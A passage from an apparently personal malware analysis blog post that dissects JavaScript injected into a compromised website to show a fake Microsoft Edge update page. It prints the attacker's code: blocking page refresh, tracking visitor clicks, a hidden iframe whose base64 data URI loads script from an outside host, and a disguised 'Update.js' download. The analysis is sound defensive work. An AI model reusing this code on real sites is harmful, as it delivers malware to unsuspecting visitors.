style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;img class=&#34;hi-dpi empty-area section-hero&#34; src=&#34;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">domain</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;updateassets/img/edge.jpg&#34;&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;  &lt;/section&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; &lt;/div&gt;&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
</code></pre></div><p>The following try/catch statement is to (I believe) effectively render the newly created innerHTML in the document body, but I am certainly no web dev expert.<br>
Once this is complete, the setInterval method is called, with two arguments - an anonymous function and the value 500. The method is built into JS, and repeatedly calls a function or executes a code snippet, with a fixed time delay (in milliseconds) between each call.<br>
At a quick glance, this appears to check child nodes to make sure they have a className set and ensure the className includes certain strings, otherwise the child node is removed. There is also a line which I am unclear on - I think it removes Google Tag Manager scroll depth tracking, but I am not positive.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">	<span style="color:#66d9ef">try</span> {
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>;
        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">cloneNode</span>(<span style="color:#66d9ef">true</span>);
        <span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">parentNode</span>.<span style="color:#a6e22e">replaceChild</span>(<span style="color:#a6e22e">z</span>, <span style="color:#a6e22e">y</span>);
    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}

    <span style="color:#a6e22e">setInterval</span>(<span style="color:#66d9ef">function</span>() {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">nodes</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">childNodes</span>;
            <span style="color:#a6e22e">nodes</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">el</span>) {
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">className</span> <span style="color:#f92672">||</span> (<span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">className</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;fatnav-header&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">className</span>.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#39;browser-landing&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)) {
                    <span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">parentNode</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">el</span>);
                }
            });
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">google_tag_manager</span>.<span style="color:#a6e22e">autoEventsSettings</span> <span style="color:#f92672">=</span> {};
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
    }, <span style="color:#ae81ff">500</span>);
</code></pre></div><p>Ok, on to some more interesting items. An eventListener is created on the <code>keydown</code> event, which is triggered when <em>any</em> key is pressed. The function assigned to the eventListener checks whether the key is <code>F5</code>, and if so, cancels the &ldquo;default action&rdquo; of the key press. This effectively stops the user from refreshing the page using the F5 key.</p>
<p>Next, after setting some variables, a document onmousemove event is created to call the previously seen sendStatistics function when the mouse is moved. After the event is triggered, the mouseMove variable is set to true, so the <code>if</code> statement will not be entered a second time, and the event trigger itself is set to <code>null</code> after the sendStatistics function returns. This should capture the very first mouse movement.</p>
<p>Looking back at the sendStatistics function, recall it appends the argument to the stage2 domain - so it would create an image object with a src value of the stage2 domain plus what appears to be a file path of random values followed by a bae64 encoded string. The b64 does not decode to anything intelligible, so assuming this is just a value to help track the first mouse movement and nothing more.</p>
<p>One of the variables previously set was <code>btn</code>, which refers to the &ldquo;Download Edge&rdquo; button seen in the fake update page screenshot. The onmouseover event for the <code>btn</code> variable is set with a custom function, which will use sendStatistics to relay another base64 string to the stage2 domain. Just like the previous onmousemove event, this appears to be to track the time when the user moved the mouse over the download button.</p>
<p>Finally, a function is created and assigned to an eventListener. This function sends yet another base64 encoded value to the stage2 server when the victim clicks on the download button.</p>
<p>Making an educated guess - this tracking is used to help the malware operators learn how intended victims interact with the fake update page, and possibly make improvements in the future. For example, if a large number of distinct users visited the site, moved the mouse around, but never hovered over or clicked the download button, this could indicate the fake page is not believable, and graphical changes may be in order. Users with long intervals between first mouse movement and the download click might indicate security researchers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">onkeydownFunc</span>(<span style="color:#a6e22e">e</span>) {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">key</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;F5&#39;</span>) {
                <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
            }
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
    }
    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;keydown&#39;</span>, <span style="color:#a6e22e">onkeydownFunc</span>, <span style="color:#66d9ef">true</span>);
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">btn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">getElementsByClassName</span>(<span style="color:#e6db74">&#39;download-button&#39;</span>)[<span style="color:#ae81ff">0</span>];
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">mouseMove</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buttonOver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">buttonClick</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
    document.<span style="color:#a6e22e">onmousemove</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">mouseMove</span>) {
            <span style="color:#a6e22e">mouseMove</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
            <span style="color:#a6e22e">sendStatistics</span>(<span style="color:#e6db74">&#39;/d37zfMjENqPAU7hblNtj9dM+Jwh+ddUUGbMUx3Kr3/pNzB41B72ptO1pOjNX5IMXkiBbWSqBGJGf/uHYw9mmw==&#39;</span>);
            document.<span style="color:#a6e22e">onmousemove</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
        }
    };
    <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">onmouseover</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">buttonOver</span>) {
            <span style="color:#a6e22e">buttonOver</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
            <span style="color:#a6e22e">sendStatistics</span>(<span style="color:#e6db74">&#39;zRyoHR7csakMS1IExZAVlxNEubNBn0J788Dz7f4yyALR/FtAvcPzbvEBHvv9RYPg2crn1O+OXvMxQDGlhNRczw==&#39;</span>);
            <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">onmouseover</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
        }
    };

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">btnClickStat</span>(<span style="color:#a6e22e">e</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">buttonClick</span>) {
            <span style="color:#a6e22e">buttonClick</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
            <span style="color:#a6e22e">sendStatistics</span>(<span style="color:#e6db74">&#39;PcYK9TMYPSAiCsqBzqoiV0UH7NwwZmA+wi1D7dARErVvNT7k8978eKYF54Ux6RAIONHlZZq130tYWLW2Yt6xRg==&#39;</span>);
        }
    }
    <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, <span style="color:#a6e22e">btnClickStat</span>, <span style="color:#66d9ef">true</span>);
</code></pre></div><p>Getting to the good stuff now. An iframe element is created, given the <code>browser-landing</code> class, and assigned a src with a base64 encoded string as the value. The style is set to not render any new content on the page by assigning the value &ldquo;none&rdquo; to the display property. The iframe element is then appended to the document body.</p>
<p>Note: an iframe is an &ldquo;inline frame&rdquo;, essentially another webpage within the webpage. The original page can communicate with the iframe; one way to do this is by posting messages, which we will see done here.</p>
<p>After the iframe is created a function called <code>btnClickAction</code> is defined. The purpose of this function is to send the string <code>download</code> to the iframe when the download button is clicked. Once the message is sent, the function sets the <code>btnActionClicked</code> variable to <code>true</code> and returns &ldquo;false&rdquo;, essentially cancelling the rest of the default actions performed when event listeners are triggered, including following the link.</p>
<p>After the <code>btnClickAction</code> eventListener is set up, one last eventListener is created. From the docs - &ldquo;The message event is fired on a Window object when the window receives a message, for example from a call to Window.postMessage() from another browsing context.&rdquo; Assuming, this eventListener is waiting for the iframe to send it a message.<br>
Once the message from the iframe is received, if the string sent is <code>loaded</code> and the <code>bntActionClicked</code> variable has been set to true, then the string <code>download</code> is sent to the iframe once again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS">    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">iframe</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;browser-landing&#39;</span>);
    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;data:text/html;base64,PGh0bWw+PGhlYWQ+PC9oZWFkPjxib2R5PjxzY3JpcHQgc3JjPSdodHRwczovL3RheGVzLnJwYWN4LmNvbS82WTU5a2JxcFRhUm5wbVBtWTc2amhWWkxoL1lPcmwwL0NQZjhRYXRMY21CYk9tWjhpSFFsSXhkT1dXOUcxdk9ibWhYVWYzSVhwUys2a2VnU3JXZng3QT09Jz48L3NjcmlwdD48L2JvZHk+PC9odG1sPg==&#39;</span>;
    <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">style</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;none&#39;</span>;
    document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">iframe</span>);
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">btnActionClicked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">btnClickAction</span>(<span style="color:#a6e22e">e</span>) {
        <span style="color:#66d9ef">try</span> {
            <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;download&#39;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {}
        <span style="color:#a6e22e">btnActionClicked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    }
    <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, <span style="color:#a6e22e">btnClickAction</span>, <span style="color:#66d9ef">true</span>);

    window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;loaded&#39;</span>) {
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">btnActionClicked</span>) {
                <span style="color:#a6e22e">iframe</span>.<span style="color:#a6e22e">contentWindow</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;download&#39;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
            }
        }
    });
})();
</code></pre></div><p>Alright, that was a lot to cover. Ending this section now for readability. In the following section, I will examine the contents of the iframe and explain how it interacts with the original webpage.</p>
<hr>
<h3 id="iframe-contents">IFrame Contents</h3>
<p>In the previous section we saw the <code>iframe.src</code> had been set to a base64 encoded string - let&rsquo;s take a look at it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#a6e22e">head</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/head&gt;&lt;body&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;hxxps://taxes[.]rpacx[.]com/6Y59kbqpTaRnpmPmY76jhVZLh/YOrl0/CPf8QatLcmBbOmZ8iHQlIxdOWW9G1vObmhXUf3IXpS+6kegSrWfx7A==&#39;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;&lt;/html&gt;</span>
</code></pre></div><p>Yet another call to the stage2 domain. The response is below, more JS captured via BurpSuite.</p>
<p>A few variables are created initially: a filename, an empty var called <code>file</code>, and a variable containing a base64 decoded string. String removed for readability, it was very long.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Update.js&#34;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filePlain</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">atob</span>(<span style="color:#e6db74">&#39;&lt;long_b64_string&gt;&#39;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">file</span>;
<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.zip&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.rar&#39;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">filename</span>.<span style="color:#a6e22e">substr</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;.iso&#39;</span>) {
    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">binArray</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>(<span style="color:#a6e22e">filePlain</span>.<span style="color:#a6e22e">length</span>);
    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">filePlain</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
        <span style="color:#a6e22e">binArray</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">filePlain</span>.<span style="color:#a6e22e">charCodeAt</span>(<span style="color:#a6e22e">i</span>);
    }
    <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#a6e22e">binArray</span>], {
        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/octet-stream&#39;</span>
    });
} <span style="color:#66d9ef">else</span> {
    <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>([<span style="color:#a6e22e">filePlain</span>], {
        <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
    });
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">btn</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;a&#39;</span>);
<span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">URL</span>.<span style="color:#a6e22e">createObjectURL</span>(<span style="color:#a6e22e">file</span>);
<span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">download</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filename</span>;
document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">btn</span>);
<span style="color:#a6e22e">parent</span>.<span style="color:#a6e22e">postMessage</span>(<span style="color:#e6db74">&#39;loaded&#39;</span>, <span style="color:#e6db74">&#34;*&#34;</span>);
window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;message&#34;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">event</span>) {
    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;download&#39;</span>) {
        <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>() {
            <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">click</span>();
        }, <span style="color:#ae81ff">100</span>);
    }
});
</code></pre></div><p>An if/else statement checks for certain file extensions on the <code>filename</code> variable, and populate the <code>file</code> variable accordingly. I&rsquo;m not sure whether the <code>filename</code> is populated dynamically in response to checks of the victim&rsquo;s system/IP/etc but this is possible. In both cases the <code>file</code> variable is created as a blob and contains either binary data or plaintext. In our case, the base64 decoded data saved to the blob appears to be even more Javascript. Referring to this as the payload.</p>
<p>Next, an <code>anchor</code> element is created and an objectURL referencing payload is assigned as the href parameter. Turning to the docs again, the createObjectURL method creates a representation of the File or Blob object passed to it. The download property is set to the filename variable, which causes the browser to treat the linked URL as a download, and assigns the name <code>Update.js</code> to the download. The <code>btn</code> node is then appended to the document body.</p>
<p>Once the payload is extracted and configured as a &ldquo;downloadable&rdquo; link, the iframe sends a message to the original webpage with the contents <code>loaded</code>. Looking back at the previous section, recall a listener was created waiting for a message from the iframe with these contents. Once this message is received, the parent webpage will check whether the download button has been clicked by the user, and once again send the message <code>download</code> back to the iframe.</p>
<p>The iframe has also created an eventListener, waiting for the parent webpage to send the <code>download</code> message. Once this is received, the iframe performs the <code>click</code> action on the <code>btn</code> object, simulating a download of the payload. No web download actually occurs however, as the payload was previously saved to the page in blob form.</p>
<hr>
<h3 id="conclusion">Conclusion</h3>
<p>So far, I&rsquo;ve walked through the malicious embedded Javascript on a victim site, and followed it to a simulated download containing a large JavaScript payload with the name <code>Update.js</code>. As this post is already quite lengthy, I am going to break it into two parts, and will dig into the JS payload and any follow up activity in a new post.</p>
]]></content>
        </item>
        
    </channel>
</rss>
